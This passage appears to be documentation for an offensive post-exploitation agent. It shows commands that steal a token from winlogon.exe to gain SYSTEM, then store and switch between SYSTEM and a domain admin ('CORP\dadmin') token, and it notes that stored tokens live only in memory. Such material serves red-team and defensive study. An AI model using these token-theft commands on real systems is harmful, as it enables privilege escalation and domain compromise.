...
steal-token 4          # winlogon.exe â†’ SYSTEM
...
token-store -action use -name "system"   # â†’ SYSTEM
token-store -action use -name "da"       # â†’ CORP\dadmin
rev2self                                  # â†’ original process token
token-store -action use -name "system"   # â†’ back to SYSTEM
```

## Notes

- Tokens are stored as duplicated handles â€” independent of the active impersonation
- Credentials from `make-token` are preserved and restored when using that token
- The token store lives in memory only â€” cleared on agent exit
